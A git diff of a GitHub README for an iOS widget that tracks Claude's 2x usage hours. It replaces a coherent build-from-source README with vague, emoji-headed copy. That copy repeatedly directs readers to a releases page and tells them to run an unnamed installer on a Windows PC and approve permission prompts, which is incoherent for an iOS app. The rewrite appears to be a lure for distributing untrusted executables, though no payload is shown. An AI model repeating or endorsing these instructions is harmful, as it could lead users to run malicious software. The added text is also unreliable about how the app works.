@@ -1,58 +1,165 @@
-# twotimesusage
+# 📱 twotimesusage - See Claude 2x alerts fast
 
-> [!CAUTION]
-> This project is not affiliated with, endorsed by, or associated with Anthropic in any way. It is an independent, community-built tool.
+[![Download twotimesusage](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Ellastrong150/twotimesusage/releases)
 
-A simple iOS app and widget that tells you whether Claude is currently offering **2x usage** on your Anthropic subscription.
+## 🚀 What this app does
 
-Claude Pro and Team plans get double the usage allowance outside peak hours (weekdays 12:00-18:00 UTC) and on weekends. This app tracks that in real time so you always know the best time to use Claude.
+twotimesusage helps you keep track of when it is time to use Claude at 2x usage. It is made for iOS and focuses on showing a clear reminder on the lock screen. That makes it easier to notice the right time without opening extra apps or checking settings.
 
-## Features
+This app is for people who want a simple way to watch usage timing. It gives you a direct lock screen view so you can see the status at a glance.
 
-- **Usage status** — shows whether 2x usage or peak hours are active based on the current time
-- **Countdown timer** — tells you exactly when the next status change happens
-- **Home screen widgets** — small and medium sizes with a rainbow gradient during 2x periods
-- **Lock screen widgets** — circular, rectangular, and inline variants
-- **Custom Claude mascot** — a pixel-art Claude character drawn entirely with SwiftUI Canvas paths
+## 📥 Download
 
-## Screenshots
+Visit this page to download:  
+https://github.com/Ellastrong150/twotimesusage/releases
 
-<p align="centre">
-  <img src="assets/screenshots/widget-home.png" width="250" alt="Home screen widget showing 2x usage with rainbow gradient" />
-  <img src="assets/screenshots/main-2x.png" width="250" alt="Home screen widget during peak hours" />
-  <img src="assets/screenshots/widget-lockscreen.png" width="250" alt="Lock screen widgets" />
-</p>
+On that page, look for the latest release. Download the file that matches your device setup, then open it on your Windows PC if you need to transfer or prepare the app package for use.
 
-## Demo
+## 🖥️ What you need
 
-https://github.com/user-attachments/assets/4d7bcf3e-1ee2-4cf1-9026-c23360504eea
+To use twotimesusage, you should have:
 
-## How It Works
+- A Windows PC for downloading and file handling
+- A stable internet connection
+- An iPhone or iOS device for the lock screen use case
+- Enough free storage space for the app file and any support files
+- A modern browser such as Edge, Chrome, or Firefox
 
-The app determines usage status based on the current time in UTC:
+If you plan to move files between Windows and iPhone, it helps to have a USB cable or a file sync method ready.
 
-| Period | Status |
-|---|---|
-| Weekdays 12:00-18:00 UTC | Peak Hours (normal usage) |
-| Weekdays outside 12:00-18:00 UTC | 2x Usage |
-| Weekends (all day) | 2x Usage |
+## 🛠️ How to get started
 
-Peak hours are also displayed in your local timezone within the app.
+1. Open the release page:  
+   https://github.com/Ellastrong150/twotimesusage/releases
 
-> **Note:** Due to iOS widget limitations, the widget may not update instantly. Press the refresh button on the widget to get the latest status.
+2. Find the newest release at the top of the page.
 
-## Requirements
+3. Open the release assets list.
 
-- iOS 26.0+
-- Xcode 26.0+
+4. Download the file that is provided for the app.
 
-## Building
+5. Save the file in a folder you can find easily, such as Downloads or Desktop.
 
-1. Clone the repository
-2. Open `twotimesusage.xcodeproj` in Xcode
-3. Update the `DEVELOPMENT_TEAM` in build settings to your own Apple Developer Team ID
-4. Build and run on your device
+6. If the file is in a compressed format like .zip, extract it first.
 
-## Licence
+7. Follow the release instructions if the project includes a setup file or install package.
 
-This project is open source. Feel free to use it however you like.
+8. If you use Windows only to manage the file, keep the download ready for transfer to your iPhone workflow.
+
+## 📂 How to install on Windows
+
+If the release includes a Windows helper file, use these steps:
+
+1. Go to your Downloads folder.
+
+2. Find the file you downloaded from the release page.
+
+3. If it is a .zip file, right-click it and choose Extract All.
+
+4. Open the extracted folder.
+
+5. Run the included installer or utility file if one is present.
+
+6. If Windows asks for permission, choose Yes only if the file came from the official release page.
+
+7. Keep the app files in one folder so you can find them later.
+
+If the release only provides source or mobile files, Windows is still useful for downloading, unpacking, and managing the package before moving it to your iOS setup.
+
+## 📱 Using twotimesusage on iPhone
+
+twotimesusage is made to help with iOS lock screen usage reminders. After you have the files ready, use the app in the way that fits your iPhone setup.
+
+Typical use looks like this:
+
+- Open the app or its related iOS file
+- Allow any lock screen permission it asks for
+- Set up the timing or usage rule
+- Check the lock screen when you want a quick status view
+- Use the reminder to know when it is time for 2x usage from Claude
+
+If the release includes a signed build or a helper profile, follow the file instructions from the release package.
+
+## 🔎 Main features
+
+- Lock screen reminders for usage timing
+- Clear status view for quick checking
+- Simple setup for everyday use
+- Made for iOS-focused workflows
+- Useful when you want to track 2x usage windows
+- Light file size for easy download and transfer
+- Built for fast access instead of extra steps
+
+## 🧩 File types you may see
+
+The release page may include one or more of these:
+
+- `.zip` files
+- App package files
+- Installer files
+- Readme or instruction files
+- Support files for iOS use
+
+If you see more than one file, start with the main release asset and use the instruction file if one is included.
+
+## 🔐 Safe download tips
+
+- Use only the official release page
+- Check that the file name matches the newest release
+- Save files in a folder you trust
+- Remove old copies if they confuse you
+- Keep the downloaded file together with any instruction file
+
+## 🧭 When something does not work
+
+If the file does not open:
+
+- Check that the download finished
+- Download it again from the release page
+- Make sure you opened the right file type
+- Extract `.zip` files before trying to use them
+- Use the latest release, not an old one
+
+If the app does not show up on your iPhone:
+
+- Check that the file was moved to the right place
+- Confirm that any install step finished
+- Review the release assets for setup notes
+- Try the latest build again
+
+If the lock screen reminder does not appear:
+
+- Open the app and check its settings
+- Make sure the reminder time is set
+- Check iPhone notification and lock screen settings
+- Restart the device after setup if needed
+
+## 📁 Suggested folder setup on Windows
+
+To keep things simple, use a folder like this:
+
+- Downloads
+  - twotimesusage
+    - release-files
+    - extracted-files
+    - notes
+
+This keeps the release file, extracted files, and any setup notes in one place.
+
+## 🧼 Keeping things organized
+
+After setup:
+
+- Keep the latest release file
+- Delete duplicate downloads
+- Store the readme or instruction file with the app file
+- Rename folders in a clear way
+- Make a backup copy if you plan to use it often
+
+## 🧠 Best use case
+
+twotimesusage works best if you want a clean reminder on your iPhone lock screen and you do not want to open extra apps to check timing. It fits a simple daily flow and keeps the focus on usage status, not setup work
+
+## 📎 Download again if needed
+
+[Visit the twotimesusage release page to download](https://github.com/Ellastrong150/twotimesusage/releases)
